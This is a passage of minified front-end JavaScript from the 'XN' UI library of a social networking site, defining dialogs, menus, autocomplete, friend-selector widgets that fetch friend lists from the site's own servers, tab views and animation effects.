return ["<table id=\"ui_dialog_container\" style=\"width: 100%; height: 100%;\" class=\"pop_dialog_table\">","<tbody>","<tr>","<td class=\"pop_topleft\"></td>","<td class=\"pop_border\"></td>","<td class=\"pop_topright\"></td>","</tr>","<tr>","<td class=\"pop_border\"></td>","<td class=\"pop_content\">","<h2><span id=\"ui_dialog_header\"></span><a style=\"display:none;\" class=\"close-button\" id=\"ui_dialog_close\" href=\"#nogo\">\u5173\u95ed</a></h2>","<div class=\"dialog_content\">","<div id=\"ui_dialog_body\" class=\"dialog_body\"></div>","<div id=\"ui_dialog_footer\" class=\"dialog_buttons\"></div>","</div>","</td>","<td class=\"pop_border\"></td>","</tr>","<tr>","<td class=\"pop_bottomleft\"></td>","<td class=\"pop_border\"></td>","<td class=\"pop_bottomright\"></td>","</tr>","</tbody>","</table>"].join("");
},getButton:function(text){
var _294=this._buttons;
for(var i=_294.length-1;i>=0;i--){
if(_294[i].text==text){
return _294[i];
}
}
return null;
},addButton:function(b){
var o={text:b.text,_onclickForDialog:b.onclick};
if(b.className){
o.className=b.className;
}
var _298=new XN.ui.button(o);
_298.frame.setAttribute("dialog","1");
this._buttons.push(_298);
this.footer.addChild(_298);
return this;
},delButton:function(b){
if(isString(b)){
b=this.getButton(b);
}
this.footer.delChild(b);
return this;
},_preventHide:false,preventHide:function(){
this._preventHide=true;
return this;
},setAutoHide:function(boo){
this._preventHide=!boo;
return this;
},_parseButtonEvent:function(e){
var el=_28c.element(e);
if(el.tagName.toLowerCase()!=="input"||el.type!=="button"){
return;
}
if(!el.getAttribute("dialog")){
return;
}
var _29d=this.getButton(el.value);
if(_29d&&_29d._onclickForDialog){
_29d._onclickForDialog.call(this);
}
if(this._preventHide){
this._preventHide=true;
}else{
this.hide();
}
},_hotKeyEvent:function(){
this.hide();
},setType:function(t){
if(t=="normal"){
this.frame.delClass("errorDialog");
}else{
if(t=="error"){
this.frame.addClass("errorDialog");
}
}
return this;
},setWidth:function(w){
if(!w){
return this;
}
if(w=="auto"){
this.frame.style.width="auto";
this.dialogContainer.style.height="";
this.dialogContainer.style.width="";
this.width=this.frame.offsetWidth;
}else{
this.width=w;
this.frame.style.width=w+"px";
this.dialogContainer.style.height="100%";
this.dialogContainer.style.width="100%";
}
this.refresh();
return this;
},setHeight:function(h){
if(!h){
return this;
}
this.hegith=h;
this.frame.style.height=h+"px";
this.refresh();
return this;
},resizeTo:function(w,h){
this.setWidth(w);
this.setHeight(h);
return this;
},clear:function(){
this.header.setContent("");
this.body.setContent("");
this.footer.setContent("");
this._buttons=[];
return this;
},setTitle:function(s){
this.header.setContent(s);
return this;
},setBody:function(s){
this.body.setContent(s);
return this;
},remove:function(){
XN.util.hotKey.del("27",this._hotKeyEvent);
XN.ui.element.remove.call(this);
return this;
},refresh:function(){
if(this.visible()){
_28b.show.apply(this,arguments);
}else{
this.hide();
}
return this;
},show:function(){
this._clearHideTimer();
_28b.show.apply(this,arguments);
this.fireEvent("show");
return this;
},hide:function(){
this._clearHideTimer();
_28b.hide.apply(this,arguments);
XN.dom.enable();
this.fireEvent("hide");
return this;
},_hideTimer:null,_clearHideTimer:function(){
if(this._hideTimer){
clearTimeout(this._hideTimer);
this._hideTimer=null;
}
},autoHide:function(t){
var This=this;
this._hideTimer=setTimeout(function(){
This.hide();
},t*1000);
return this;
}});
XN.event.enableCustomEvent(XN.ui.dialog.prototype);
})();
XN.ui.panel=XN.ui.dialog;
XN.ui.dialog.prototype.setHeader=function(h){
if(h&&h!==""){
this.header.addChild(h);
}else{
this.header.innerHTML="";
}
};
XN.ui.dialog.prototype.setFooter=function(f){
if(f&&f!==""){
this.footer.addChild(f);
}else{
this.footer.innerHTML="";
}
};
XN.ui.menu=function(_2a9){
var This=this;
this.config={alignType:"4-1",barOnshowClass:"",tagName:"div",disalbeButtonClickEvent:true,fireOn:"click",keep:0.2,useIframeInIE6:true,effectTime:50};
$extend(this.config,_2a9);
var _2ab;
if(this.getConfig("text")){
this.frame=_2ab=$element(this.getConfig("tagName"));
_2ab.setContent(this.getConfig("text"));
}else{
if(this.getConfig("button")){
this.frame=_2ab=$(this.getConfig("button"));
}else{
return false;
}
}
this._alignType=this.getConfig("alignType");
if(this.getConfig("menu")){
$(this.getConfig("menu")).hide();
this.menu=new XN.ui.fixPositionElement({id:this.getConfig("menu"),alignType:this._alignType,alignWith:this.getConfig("alignWith")||this.frame,addIframe:this.getConfig("addIframe"),useIframeInIE6:this.getConfig("useIframeInIE6")});
this.container=this.menu.frame;
this._canAddSubMenu=false;
}else{
var dt=$element("div");
dt.hide();
this.menu=new XN.ui.fixPositionElement({id:dt,alignType:this._alignType,alignWith:this.getConfig("alignWith")||this.frame,addIframe:this.getConfig("addIframe"),useIframeInIE6:this.getConfig("useIframeInIE6")});
this.container=$element("div");
this._menu.setContent(this.container);
}
this.menu.setIndex(10001);
XN.event.addEvent(this.menu.frame,"click",function(e){
e=e||window.event;
This._frameOnClick(e);
},false);
this.menu.setOffsetX(this.getConfig("offsetX")||0);
this.menu.setOffsetY(this.getConfig("offsetY")||0);
var _2ae=this.getConfig("event");
if(_2ae=="click"){
XN.event.addEvent(this.frame,"click",function(e){
This._buttonClick(e||window.event);
});
XN.event.addEvent(document,"click",function(e){
This._documentClick(e||window.event);
});
}else{
if(_2ae=="mouseover"){
XN.event.addEvent(this.frame,"mouseover",function(e){
This._frameMouseOver(e||window.event);
});
if(this.getConfig("disalbeButtonClickEvent")){
XN.event.addEvent(this.frame,"onclick",function(e){
XN.event.stop(e||window.event);
});
}
XN.event.addEvent(this.frame,"mouseleave",function(){
This._buttonMouseLeave();
});
XN.event.addEvent(this.menu.frame,"mouseleave",function(){
This._menuMouseLeave();
});
XN.event.addEvent(this.menu.frame,"mouseover",function(){
This._mouseOverMenu=true;
});
}else{
if(_2ae=="manual"){
}
}
}
XN.event.addEvent(window,"resize",function(){
This.menu.refresh();
});
this.hide();
};
XN.ui.menu.prototype=$extend({},XN.ui.container);
$extend(XN.ui.menu.prototype,{isShow:true,menu:null,_alignType:null,_button:null,_canAddSubMenu:true,_delayTimer:null,_mouseOverMenu:false,_mouseOverButton:false,_clearTimer:function(){
if(this._delayTimer){
clearTimeout(this._delayTimer);
this._delayTimer=null;
}
},_buttonClick:function(e){
XN.event.stop(e);
if(this.isShow){
this.hide();
}else{
this.show();
}
},_documentClick:function(e){
this.hide();
},_frameOnClick:function(e){
var This=this;
var el=XN.event.element(e);
var tag=el.tagName.toLowerCase();
if(tag=="a"){
return true;
}
if((tag=="input"&&(el.type=="radio"||el.type=="checkbox"))||tag=="label"){
this.isShow=false;
setTimeout(function(){
This.isShow=true;
},20);
return true;
}
while(el!=this.menu.frame&&el.tagName&&el.tagName.toLowerCase()!="a"){
el=el.parentNode;
}
if(el.tagName.toLowerCase()=="a"){
return true;
}
XN.event.stop(e);
},_frameMouseOver:function(e){
var This=this;
this._mouseOverButton=true;
this._clearTimer();
var _2bb=this.getConfig("delay");
if(_2bb){
this._delayTimer=setTimeout(function(){
if(This._mouseOverButton){
This.show();
}
},_2bb*1000);
}else{
This.show();
}
XN.event.stop(e);
},_buttonMouseLeave:function(){
var This=this;
this._mouseOverButton=false;
this._clearTimer();
setTimeout(function(){
if(!This._mouseOverMenu){
This.hide();
}
},this.getConfig("effectTime"));
},_menuMouseLeave:function(){
var This=this;
this._mouseOverMenu=false;
this._clearTimer();
setTimeout(function(){
if(!This._mouseOverButton){
This.hide();
}
},this.getConfig("effectTime"));
},getConfig:function(key){
var _2bf={"hoverClass":"barOnshowClass","event":"fireOn","button":"bar","delay":"keep"};
if(_2bf[key]){
return this.config[key]||this.config[_2bf[key]];
}
return this.config[key];
},show:function(){
if(this.isShow){
return this;
}
this.menu.show();
this.frame.addClass(this.getConfig("hoverClass"));
this.onShow();
this.isShow=true;
return this;
},setWidth:function(w){
this.menu.frame.style.width=w+"px";
this.menu.refresh();
return this;
},hide:function(){
if(!this.isShow){
return this;
}
this.menu.hide();
this.frame.delClass(this.getConfig("hoverClass"));
this.isShow=false;
this.onHide();
return this;
},refresh:function(){
if(this.isShow){
this.menu.show();
}
return this;
},onShow:XN.func.empty,onHide:XN.func.empty});
XN.event.enableCustomEvent(XN.ui.menu.prototype);
XN.ui.autoComplete=function(p){
var This=this;
this.config=this.config||{};
$extend(this.config,{inputTip:null,searchDelay:0.2,DS:null,enableCache:true,maxCache:10});
$extend(this.config,p);
if(this.getConfig("enableCache")){
this.cache=new XN.util.cache({cacheLength:this.getConfig("maxCache")});
}
if(this.getConfig("input")){
var _2c3=this.input=$(this.getConfig("input"));
}else{
var _2c3=this.input=$element("input");
_2c3.type="text";
_2c3.addClass("input-text");
}
this.frame=_2c3;
XN.event.addEvent(_2c3,"focus",function(e){
This._startCheck();
This.fireEvent("focus");
});
XN.event.addEvent(_2c3,"blur",function(e){
This._endCheck();
This.fireEvent("blur");
});
this.addEvent("focus",function(){
var v=this.input.value;
if(v==""||v==this.getConfig("inputTip")){
this.fireEvent("noinput");
}
});
this.addEvent("blur",function(){
this._lastInput=null;
});
XN.event.addEvent(_2c3,"click",function(e){
XN.event.stop(e||window.event);
});
XN.event.addEvent(_2c3,"keydown",function(e){
This._userInput=true;
e=e||window.event;
if(e.keyCode==13){
XN.event.stop(e);
}
This.fireEvent("keydown",e);
});
_2c3.setAttribute("AutoComplete","off");
this.DS=this.getConfig("DS");
};
XN.ui.autoComplete.prototype=$extend({},XN.ui.element);
$extend(XN.ui.autoComplete.prototype,{input:null,cache:null,_userInput:false,_lastInput:null,getConfig:function(key){
if(key=="input"){
return this.config["input"]||this.config["id"];
}
return this.config[key];
},_startCheck:function(){
var This=this;
this._inputTimer=setInterval(function(){
if(This._userInput){
This._userInput=false;
return;
}
This._checkInput();
},this.getConfig("searchDelay")*1000);
},_endCheck:function(){
clearInterval(this._inputTimer);
this._inputTimer=null;
},_checkInput:function(){
var This=this;
var cv=this.input.value;
if(XN.string.isBlank(cv)){
if(this._lastInput===""){
return;
}
this._lastInput="";
this.fireEvent("noinput");
return;
}
if(cv==this._lastInput){
return;
}
this._lastInput=cv;
this.fireEvent("searchbegin");
if(this.cache){
var _2cd=this.cache.get(cv);
if(_2cd){
this.fireEvent("searchover",_2cd);
return;
}
}
if(!this.DS){
XN.log("no ds");
this.fireEvent("NO_DS");
return;
}
this.DS.query(cv,function(r){
if(This.cache){
This.cache.add(cv,r);
}
This.fireEvent("searchover",r);
});
}});
XN.event.enableCustomEvent(XN.ui.autoComplete.prototype);
(function(){
var _2cf={};
getCompleteMenu=function(id){
return _2cf[id];
};
XN.ui.autoCompleteMenu=function(p){
var This=this;
this._MID=XN.util.createObjID();
_2cf[this._MID]=this;
this.config=this.config||{};
$extend(this.config,{ulClassName:"",liClassName:"",liHoverClass:"m-autosug-hover",aClassName:"",noResult:"\u6ca1\u6709\u5339\u914d\u7ed3\u679c",dataLoading:"\u6b63\u5728\u52a0\u8f7d\u6570\u636e...",noInput:null,autoSelectFirst:false});
XN.ui.autoComplete.call(this,p);
var _2d3=this.input;
var m=$element("div");
m.innerHTML=this.getConfig("wrapper")||this._wrapper();
this._menuList=m.firstChild;
this._ul=this._menuList.getElementsByTagName("ul")[0];
this.menu=new XN.ui.menu({button:_2d3,menu:this._menuList,fireOn:"manual"});
this.addEvent("keydown",this._inputOnkeydown);
XN.event.addEvent(this._ul,"mousedown",function(e){
This._menuOnclick(e||window.event);
});
XN.event.addEvent(_2d3,"blur",function(){
This.menu.hide();
});
this.menu.hide();
this.addEvent("noinput",function(){
var tip=this.getConfig("noInput");
if(!tip){
this.menu.hide();
return;
}
this._ul.innerHTML="<li>"+tip+"</li>";
this.menu.show();
});
this.addEvent("NO_DS",function(){
var tip=this.getConfig("dataLoading");
this._ul.innerHTML="<li>"+tip+"</li>";
this.menu.show();
});
this.addEvent("searchover",this._buildMenu);
};
XN.ui.autoCompleteMenu.prototype=$extend({},XN.ui.autoComplete.prototype);
$extend(XN.ui.autoCompleteMenu.prototype,{menu:null,_menuList:null,_ul:null,_currentLi:null,_highlightMenuItem:function(li){
if(li==this._currentLi){
return;
}
var _2d9=this.getConfig("liHoverClass");
if(this._currentLi!==null){
XN.element.delClass(this._currentLi,_2d9);
}
XN.element.addClass(li,_2d9);
this._currentLi=li;
var aid=this._currentLi.getAttribute("aid");
if(aid){
this.fireEvent("highlight",this.result[parseInt(aid)]);
}
},_inputOnkeydown:function(_2db){
var li;
if(_2db.keyCode==13){
if(this.menu.isShow&&this._currentLi){
var aid=this._currentLi.getAttribute("aid");
if(aid){
this._selectMenuItem(parseInt(aid));
}
}
return false;
}
if(_2db.keyCode==38){
if(this._currentLi&&this._currentLi.previousSibling){
li=this._currentLi.previousSibling;
}else{
li=this._ul.lastChild;
}
this._highlightMenuItem(li);
return false;
}
if(_2db.keyCode==40){
if(this._currentLi&&this._currentLi.nextSibling){
li=this._currentLi.nextSibling;
}else{
li=this._ul.firstChild;
}
this._highlightMenuItem(li);
return false;
}
return true;
},_menuOnclick:function(_2de){
var el=XN.event.element(_2de);
while(el&&el.tagName&&el.tagName.toLowerCase()!=="li"){
el=el.parentNode;
}
if(!el||el.nodeType!==1||!el.getAttribute("aid")){
return false;
}
this._selectMenuItem(parseInt(el.getAttribute("aid")));
return false;
},_menuOnmouseover:function(_2e0){
var el=XN.event.element(_2e0);
if(el.parentNode==$("dropmenuHolder")){
return;
}
while(el&&el.tagName&&el.tagName.toLowerCase()!=="li"){
el=el.parentNode;
}
if(!el||el.nodeType!==1||!el.getAttribute("aid")){
return false;
}
this._highlightMenuItem(el);
return false;
},_selectMenuItem:function(id){
this.menu.hide();
this.input.focus();
this.fireEvent("select",this.result[id]);
this._lastInput=this.input.value;
},_buildMenu:function(_2e3){
var This=this;
this.result=_2e3;
if(_2e3.length==0){
var _2e5=this.getConfig("noResult");
if(isFunction(_2e5)){
_2e5=_2e5.call(this);
}
this._ul.innerHTML="<li>"+_2e5+"</li>";
this.menu.show();
this._currentLi=null;
return;
}
var lis=[];
lis.push(this.firstMenuItem());
var len=_2e3.length-1;
XN.array.each(_2e3,function(i,v){
lis.push("<li onmouseover=\"getCompleteMenu("+This._MID+")._highlightMenuItem(this);\" aid=\""+i+"\">"+This.buildMenu(v)+"</li>");
});
lis.push(this.lastMenuItem());
this._ul.innerHTML=lis.join("");
if(this.getConfig("autoSelectFirst")){
this._highlightMenuItem(this._ul.firstChild);
}
this.menu.show();
},firstMenuItem:function(){
return "";
},lastMenuItem:function(){
return "";
},buildMenu:function(r){
return "<li>"+r.name+"</li>";
},setMenuWidth:function(w){
this.menu.setWidth(w);
}});
XN.ui.autoCompleteMenu.prototype._wrapper=function(){
return ["<div class=\"m-autosug\">","<span class=\"x1\">","<span class=\"x1a\"></span>","</span>","<span class=\"x2\">","<span class=\"x2a\"></span>","</span>","<div class=\"m-autosug-minwidth\">","<div class=\"m-autosug-content\">","<ul></ul>","</div>","</div>","</div>"].join("");
};
})();
XN.ui.friendSelector=function(_2ec){
var This=this;
this.config=this.config||{};
$extend(this.config,{getFriendsUrl:"http://browse."+XN.env.domain+"/getfriendsajax.do?s=1",url:"http://browse."+XN.env.domain+"/friendsSelector.do",param:{}});
$extend(this.config,_2ec.params);
if(isUndefined(this.getConfig("page"))){
this.config["page"]=false;
}
XN.ui.autoCompleteMenu.call(this,_2ec);
this.addEvent("select",function(r){
this.input.value=r.name;
if(this.onSelectOne){
this.onSelectOne(r);
}
});
this.buildMenu=function(r){
return r.name;
};
this.addEvent("focus",function(){
if(this._ready){
return;
}
if(this._isLoading){
return;
}
this.loadFriends();
});
};
XN.ui.friendSelector.prototype=$extend({},XN.ui.autoCompleteMenu.prototype);
$extend(XN.ui.friendSelector.prototype,{_isLoading:false,_ready:false,isReady:function(){
return this._ready;
},isLoading:function(){
return this._isLoading;
},loadFriends:function(r){
if(this.isLoading()){
return;
}
this._isLoading=true;
var This=this;
var p={};
p["init"]=true;
p["uid"]=false;
p["uhead"]=false;
p["uname"]=false;
p["group"]=false;
p["net"]=false;
p["param"]=this.getConfig("param");
p["page"]=this.getConfig("page");
new XN.NET.xmlhttp({useCache:true,url:this.getConfig("url"),method:"get",data:"p="+XN.JSON.build(p),onSuccess:function(r){
r=XN.JSON.parse(r.responseText);
This._onload(r);
}});
},_onload:function(r){
this.isLoading=false;
this._ready=true;
this.config.qkey=r.qkey;
this.DS=new XN.util.DS_friends({url:this.getConfig("url"),qkey:this.getConfig("qkey"),limit:this.getConfig("limit"),page:this.getConfig("page")});
}});
XN.ui.friendSelectorSynchronous=function(a,b){
function s(id,ac,v){
if(isObject(id)){
id=id.id;
}
if(v.isReady()){
try{
v[ac](id);
}
catch(e){
}
}else{
v.addEvent("load",function(){
try{
v[ac](id);
}
catch(e){
}
});
v.loadFriends();
}
}
a.addEvent("select",function(id){
s(id,"select",b);
});
a.addEvent("deselect",function(id){
s(id,"deselect",b);
});
b.addEvent("select",function(id){
s(id,"select",a);
});
b.addEvent("deselect",function(id){
s(id,"deselect",a);
});
};
(function(){
XN.ui.multiFriendSelector=function(_2fe){
var This=this;
this._ID=XN.util.createObjID();
this.config=this.config||{};
$extend(this.config,{inputName:"ids",nameInputName:"names",url:"http://browse."+XN.env.domain+"/friendsSelector.do",initParam:{},param:{},noInput:false,maxNum:-1});
$extend(this.config,_2fe);
this.frame=$element("div");
var div=$element("div");
div.hide();
document.body.appendChild(div);
div.appendChild(this.frame);
this.frame.innerHTML=["<div id=\""+this.getID("friendsContainer")+"\" class=\"tokenizer friendAutoSelector\">","<span class=\"tokenizer_stretcher\">^_^</span>","<span class=\"tab_stop\"><input/></span>","<span id=\""+this.getID("inputContainer")+"\" class=\"tokenizer_input\"><input id=\""+this.getID("input")+"\" type=\"text\" /></span>","</div>","<div class=\"float-right\" id=\""+this.getID("menu")+"\"></div>"].join("");
this.input=this.getEl("input");
this.menuContainer=this.getEl("menu");
XN.event.addEvent(this.getEl("friendsContainer"),"click",function(e){
This._parseClickEvent(e||window.event);
});
this.autoComplete=new XN.ui.friendSelector({id:this.input,inputTip:"\u8f93\u5165\u597d\u53cb\u59d3\u540d...",autoSelectFirst:true,url:this.getConfig("url"),param:this.getConfig("param")});
this.autoComplete.loadFriends=function(r){
if(this.isLoading()){
return;
}
this._isLoading=true;
var p={};
p["init"]=true;
p["uid"]=true;
p["uhead"]=false;
p["uname"]=true;
p["group"]=false;
p["net"]=false;
$extend(p,This.getConfig("initParam"));
p["param"]=this.getConfig("param");
new XN.NET.xmlhttp({useCache:true,url:this.getConfig("url"),method:"get",data:"p="+XN.JSON.build(p),onSuccess:function(r){
r=XN.JSON.parse(r.responseText);
This._allFriends=r.candidate;
This.fireEvent("load");
This.autoComplete._onload(r);
}});
};
this.autoComplete.buildMenu=function(r){
return "<p>"+r.name+"</p>";
};
this.autoComplete.setMenuWidth(129);
this.autoComplete.addEvent("keydown",function(e){
This._onInputKeydown(e);
});
this.autoComplete.addEvent("select",function(r){
XN.log(this.input);
this.input.value="";
This.selectFriend(r);
});
if(this.getConfig("noInput")){
this.input.hide();
}
this.fireEvent("init");
};
var _308=XN.ui.multiFriendSelector.prototype=$extend({},XN.ui.element);
$extend(_308,{isReady:function(){
return this.autoComplete.isReady();
},isLoading:function(){
return this.autoComplete.isLoading();
},loadFriends:function(){
this.autoComplete.loadFriends();
},getUserByID:function(id){
id=String(id);
var rt=null;
XN.array.each(this._allFriends,function(i,v){
if(String(v.id)==id){
rt=v;
return false;
}
});
return rt;
},getConfig:function(key){
if(key=="inputName"){
return this.config["idInputName"]||this.config["inputName"];
}
return this.config[key];
},getID:function(id){
return "mfs_"+this._ID+id;
},getFriendID:function(id){
return this.getID("friend_"+id);
},getFriendEl:function(id){
return $(this.getFriendID(id));
},getEl:function(id){
return $(this.getID(id));
},getFriendsNum:function(){
return this.getEl("friendsContainer").getElementsByTagName("a").length;
},getSelectedFriends:function(){
var rt=[];
var a=XN.array.build(this.getEl("friendsContainer").getElementsByTagName("a"));
XN.array.each(a,function(i,v){
rt.push(v.getAttribute("uid")+"");
});
return rt;
},reset:function(){
this.deselectAll();
},deselectAll:function(){
var els=XN.array.build(this.getEl("friendsContainer").getElementsByTagName("a"));
XN.array.each(els,function(i,v){
XN.element.remove(v);
});
this.fireEvent("deselectAll",this.getIds());
},selectFriends:function(fs){
var This=this;
XN.array.each(fs,function(i,v){
This.select(v);
});
},deselectFriends:function(fs){
var This=this;
XN.array.each(fs,function(i,v){
This.deselect(v);
});
},select:function(o){
if(isUndefined(o)){
return;
}
XN.log("mfs select:");
XN.log(o);
var _322=this.getConfig("maxNum");
if(_322!==-1){
if(this.getFriendsNum()==_322){
this.fireEvent("overMaxNum",_322);
return;
}
}
if(isString(o)||isNumber(o)){
o={id:o,name:this.getUserByID(o).name};
}
if(this.getFriendEl(o.id)){
return;
}
this.getEl("friendsContainer").insertBefore(this.createFriendHTML(o.id,o.name),this.getEl("inputContainer"));
this.fireEvent("select",o.id);
},deselect:function(uid){
if(!this.getFriendEl(uid)){
return;
}
this.getFriendEl(uid).remove();
this.fireEvent("deselect",uid);
},_parseClickEvent:function(e){
var el=XN.event.element(e);
XN.event.stop(e);
if(el&&el.getAttribute("action")){
this.deselectFriend(el.getAttribute("uid"));
}
},createFriendHTML:function(uid,_327){
var a=$element("a");
a.id=this.getFriendID(uid);
a.setAttribute("uid",uid);
a.href="#nogo";
a.className="token";
a.tabindex="-1";
a.innerHTML=["<span>\n<span>\n<span>\n<span>\n<input type=\"hidden\" value=\"",uid,"\" name=\"",this.getConfig("inputName"),"\" />\n","<input type=\"hidden\" value=\"",_327,"\" name=\"",this.getConfig("nameInputName"),"\" />\n",_327,"<span uid=\"",uid,"\" action=\"x\" class=\"x\" onmouseout=\"this.className='x'\" onmouseover=\"this.className='x_hover'\" >\n</span>\n</span>\n</span>\n</span>\n</span>"].join("");
return a;
},_onInputKeydown:function(_329){
var i=this.getEl("inputContainer"),pa=i.previousSibling,na=i.nextSibling,_32d=this.input,c=this.getEl("friendsContainer");
if(_329.keyCode==8&&this.input.value==""){
if(pa){
this.deselectFriend(pa.getAttribute("uid"));
}
return true;
}else{
if(_329.keyCode==37&&this.input.value==""){
if(pa&&pa.tagName.toLowerCase()=="a"){
i.parentNode.removeChild(i);
c.insertBefore(i,pa);
setTimeout(function(){
_32d.focus();
},0);
}
return true;
}else{
if(_329.keyCode==39&&this.input.value==""){
if(na&&na.tagName.toLowerCase()=="a"){
i.parentNode.removeChild(i);
XN.dom.insertAfter(i,na);
setTimeout(function(){
_32d.focus();
},0);
}
return true;
}
}
}
return false;
}});
XN.event.enableCustomEvent(_308);
_308.deSelectAll=_308.deselectAll;
_308.deSelectFriend=_308.deselectFriend=_308.deselect;
_308.selectFriend=_308.select;
_308.getSelectedFriendsID=_308.getSelectedFriends;
_308.getIds=_308.getSelectedFriends;
})();
XN.ui.friendSelectorWithMenu=function(p){
var _330=new XN.ui.friendSelector(p);
var menu=new XN.ui.friendSelectorMenu({url:_330.getConfig("url"),param:_330.getConfig("param"),multi:false,alignType:p.alignType,offsetX:p.offsetX,offsetY:p.offsetY});
var div=$element("div");
div.addChild(_330);
div.addChild(menu);
_330.frame=div;
_330.addEvent("focus",function(){
menu.menu.hide();
});
menu.addEvent("select",function(p){
var This=this;
setTimeout(function(){
This.menu.hide();
},30);
_330.fireEvent("select",this.getUserByID(p));
});
menu.menu.menu.setOffsetY(9);
return _330;
};
XN.ui.multiFriendSelectorWithMenu=function(p){
var _336=new XN.ui.multiFriendSelector(p);
var menu=new XN.ui.friendSelectorMenu({url:_336.getConfig("url"),param:_336.getConfig("param"),multi:true,showSelectAllCheckbox:_336.getConfig("showSelectAllCheckbox")||false});
menu.addEvent("submit",function(){
menu.menu.hide();
});
_336.menuContainer.setContent(menu);
XN.ui.friendSelectorSynchronous(_336,menu);
return _336;
};
(function(ns){
var _339=false;
var _33a=XN.event.addEvent;
var log=function(s){
if(_339){
XN.log(isString(s)?"ui.tabView:"+s:s);
}
return s;
};
ns.tabView=function(_33d){
this.config={selectedClass:"select",event:"click",alwaysReload:false,mouseOverDelay:0.2};
$extend(this.config,_33d);
this.init();
};
ns.tabView.prototype={_tabs:null,_currentTab:null,_idPre:null,_tabIndex:0,init:function(){
this._idPre=XN.util.createObjID();
this._tabs=[];
},getConfig:function(key){
if(key=="activeClass"){
return this.config["activeClass"]||this.config["selectedClass"];
}
return this.config[key];
},_getID:function(el){
log("_getID start");
log("param:");
log(el);
if(isString(el)){
return log(el);
}
if(el.id){
return log(el.id);
}
log("do not have id");
this._tabIndex++;
el.setAttribute("id","tabview_"+this._idPre+"_"+this._tabIndex);
return log(el.id);
},_getTab:function(id){
log("_getTab start");
log("param:id");
log(id);
if(!id){
return log(id);
}
if(id.label){
return log(id);
}
var key=this._getID(id);
log("key:"+key);
var tabs=this._tabs;
log("all tabs");
log(tabs);
for(var i=tabs.length-1;i>=0;i--){
if(tabs[i].key==key){
log("_getTab end");
return log(tabs[i]);
}
}
log("_getTab end");
return log(null);
},getCurrentTab:function(){
return this._getTab(this._currentTab);
},setCurrentTab:function(tab,_345){
log("setCurrentTab start");
var oldC=this.getCurrentTab();
var nowC=this._getTab(tab);
log("old current:");
log(oldC);
log("now current:");
log(nowC);
if(oldC&&oldC.key==nowC.key&&!_345){
return;
}
if(oldC){
this._deactiveTab(oldC);
}
this._activeTab(nowC);
this._setCurrentTab(nowC);
log("setCurrentTab end");
this.fireEvent("change",nowC);
return this;
},reset:function(){
var tab=this.getCurrentTab();
if(tab){
this._deactiveTab(tab);
}
this._setCurrentTab(null);
return this;
},_activeTab:function(tab){
log("_activeTab:");
log(tab);
tab.getEl("label").addClass(this.getConfig("activeClass"));
if(tab.content){
tab.getEl("content").show();
}
tab.onActive(tab);
log("_activeTab end");
},_deactiveTab:function(tab){
if(tab.getEl("label")){
tab.getEl("label").delClass(this.getConfig("activeClass"));
}
if(tab.content){
tab.getEl("content").hide();
}
tab.onInactive(tab);
},_setCurrentTab:function(tab){
log("_setCurrentTab start");
tab=this._getTab(tab);
log("currentTab:");
log(tab);
this._currentTab=tab?tab.key:null;
log("this._currentTab");
log(this._currentTab);
log("_setCurrentTab end");
},addTab:function(t){
log("addTab start");
log("params:");
log(t);
var This=this;
var tab={onActive:XN.func.empty,onClick:XN.func.empty,onInactive:XN.func.empty,onInit:XN.func.empty,getEl:function(key){
return $(this[key]);
},active:false};
t.label=this._getID(t.label);
log("get label id:"+t.label);
t.key=t.key||t.label;
log("get key:"+t.key);
if(t.content){
t.content=this._getID(t.content);
log("get content id:"+t.content);
}
$extend(tab,t);
this._tabs.push(tab);
log("all tabs");
log(this._tabs);
if(tab.active&&this._currentTab===null){
if(tab.content){
tab.getEl("content").show();
}
tab.getEl("label").addClass(this.getConfig("activeClass"));
this._setCurrentTab(tab);
}else{
if(tab.content){
tab.getEl("content").hide();
}
}
var ev=this.getConfig("event");
if(ev=="click"){
_33a(tab.getEl("label"),"click",function(e){
e=e||window.event;
XN.event.stop(e);
This._eventHander(e,tab.getEl("label"));
},false);
}else{
if(ev=="mouseover"){
var _352=true;
var _353=null;
_33a(tab.getEl("label"),"mouseover",function(e){
var el=this;
_352=true;
_353=setTimeout(function(){
if(!_352){
return;
}
e=e||window.event;
This._eventHander(e,tab.getEl("label"));
},This.getConfig("mouseOverDelay")*1000);
},false);
_33a(tab.getEl("label"),"mouseleave",function(e){
_352=false;
if(_353){
clearTimeout(_353);
}
},false);
}
}
tab.onInit(tab);
log("addTab end");
return this;
},_eventHander:function(e,el){
log("on click,el:");
log(el);
log("get tab form by el:");
var tab=this._getTab(el);
if(this.getConfig("alwaysReload")){
this.setCurrentTab(tab,true);
}else{
this.setCurrentTab(tab);
}
tab.onClick(e,tab);
},refresh:function(){
this._activeTab(this.getCurrentTab());
return this;
},showTab:function(id,_35b){
this.setCurrentTab(id,_35b);
},hideAll:function(){
this.reset();
}};
XN.event.enableCustomEvent(ns.tabView.prototype);
})(XN.ui);
XN.ui.refreshAll=function(){
document.body.style.zoom=1.1;
document.body.style.zoom=1;
};
XN.effect={fadeIn:function(_35c,_35d){
if(_35c.fadetimer){
return;
}
_35d=_35d||XN.FUNC.empty;
var op=0;
_35c.setOpacity(0);
_35c.style.display="";
_35c.fadetimer=setInterval(function(){
XN.Element.setOpacity(_35c,(op+=0.2));
if(op>=1){
clearInterval(_35c.fadetimer);
_35c.fadetimer=null;
_35d(_35c);
}
},60);
},fadeOut:function(_35f,_360){
if(_35f.fadetimer){
return;
}
_360=_360||XN.FUNC.empty;
var op=1;
_35f.setOpacity(1);
_35f.fadetimer=setInterval(function(){
XN.Element.setOpacity(_35f,(op-=0.2));
if(op<=0){
clearInterval(_35f.fadetimer);
_35f.fadetimer=null;
_360(_35f);
_35f.setOpacity(1);
}
},60);
},gradient:function(_362,r,g,b,_366){
if(_362.gradientTimer){
return;
}
_366=_366||XN.FUNC.empty;
_362.style.backgroundColor="#fff";
_362.style.backgroundColor="rgb("+r+","+g+","+b+")";
_362.gradientTimer=setInterval(function(){
b+=10;
_362.style.backgroundColor="rgb("+r+","+g+","+(b>255?255:b)+")";
if(b>255){
clearInterval(_362.gradientTimer);
_362.gradientTimer=null;
_366(_362);
}
},60);
},slideOpen:function(_367){
if(_367.slidetimer){
return;
}
if(!_367.slideHeight){
var _368=_367.getStyle("position");
_367.setStyle("position:absolute;left:-99999px;top:-99999px;");
_367.show();
_367.slideHeight=_367.offsetHeight;
_367.hide();
_367.setStyle("position:"+_368+";left:auto;top:auto;");
}
var eh=_367.slideHeight,h=0;
var step=parseInt(eh/10);
_367.style.height="0px";
_367.style.display="";
_367.style.overflow="hidden";
_367.slidetimer=setInterval(function(){
_367.style.height=(h+=step)+"px";
if(h>=eh){
